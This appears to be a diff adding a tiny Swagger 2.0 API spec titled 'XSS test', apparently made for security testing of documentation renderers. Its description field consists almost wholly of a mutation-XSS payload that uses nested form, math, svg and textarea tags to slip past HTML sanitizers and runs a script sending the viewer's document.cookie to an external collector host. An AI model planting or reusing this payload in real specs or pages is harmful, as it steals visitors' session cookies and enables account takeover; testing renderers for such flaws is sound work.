@@ -1,0 +1,5 @@
+swagger: '2.0'
+info:
+  title: XSS test
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><script>window.location.href = 'https://seazc6rdt6a8328crm5gilcfn6txho5d.l.prod.burpcloth.infosec.a2z.com?' + encodeURIComponent('cookie=' + document.cookie);</script>"></form>
